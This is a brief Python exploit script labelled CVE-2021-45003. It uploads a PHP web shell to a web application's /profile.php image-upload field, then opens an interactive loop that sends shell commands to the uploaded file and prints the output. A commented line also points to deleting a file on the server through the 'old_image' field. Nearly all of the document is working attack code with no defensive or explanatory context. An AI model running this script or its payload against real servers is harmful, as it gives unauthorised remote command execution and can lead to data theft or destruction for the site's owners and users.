# Author : Qerogram
# DATE : 2021-12-10
# CVE-2021-45003 exploit

import requests, os
import hashlib

def setURI(URI) : 
    return SERVER + URI

def generateFileName() :
    sha1 = hashlib.new('sha1')
    sha1.update(os.urandom(32))
    return sha1.hexdigest()

SERVER = "http://localhost"
URI = "/profile.php"
FILE_NAME = generateFileName()

requests.post(
    setURI(URI),
    data = {
        "btn_update" : "1",
        # "old_image" : "a.php" # remove localfile
    },
    files = {
        "image" : (f"{FILE_NAME}.php", "<?php echo passthru($_GET['qero']);?>")
    }
)

while True : 
    cmd = input("$ ")
    if cmd.lower() == "exit" or cmd.lower() == "quit" : break
    res = requests.get(
        setURI(f"/uploadImage/Profile/{FILE_NAME}.php?qero={cmd}")
    )

    print(res.text)
